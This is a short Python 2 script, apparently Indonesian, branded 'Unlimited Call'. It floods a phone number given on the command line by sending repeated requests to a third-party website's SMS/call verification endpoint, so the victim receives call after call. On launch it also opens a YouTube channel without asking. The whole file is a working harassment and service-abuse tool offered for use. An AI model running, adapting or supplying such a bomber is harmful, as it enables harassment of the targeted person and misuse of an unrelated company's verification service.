#!/usr/bin/python2
#coding=utf-8
import requests as r
import os,sys
from time import sleep

class lor:
	r='\033[1;91m'
	k='\033[1;92m'
	c='\033[1;96m'
	p='\033[1;95m'
	b='\033[1;94m'
	o='\033[1;90m'

def Help():
     print lor.k+'\nUsage: python2 cal.py <Nomor> <Jumlah>'
     print lor.c+'Ex:    python2 cal.py 085218949xxx 10\n'
os.system('clear')
os.system('xdg-open https://www.youtube.com/channel/UCuPp2fYqlG7IvltINFMAOgQ')
sleep(1)
print lor.c+"                 =[💟 Coded by "+lor.p+"AsecC eror404 💟="+lor.c
print "            +  --  --=[💟 "+lor.k+"Unlimited "+lor.b+"Call "+lor.c+"💟]=--  --  +"
print "                             "+lor.r+"*"+lor.o+" Nanta "+lor.r+"*\n\n"
if len(sys.argv) != 3:
     Help()
     exit(1)
nom = sys.argv[1]
jml = int(sys.argv[2])
for i in range(jml):
	cal = r.post("https://taniloka.id/acct/smscode.php?phone="+nom)
	if 'belum 60secs, coba lagi' in cal.text:
		print lor.r+"Limit Call >> "+lor.c+nom
	else:
		print lor.k+"Sucsses Call >> "+lor.c+nom
		sleep(15)
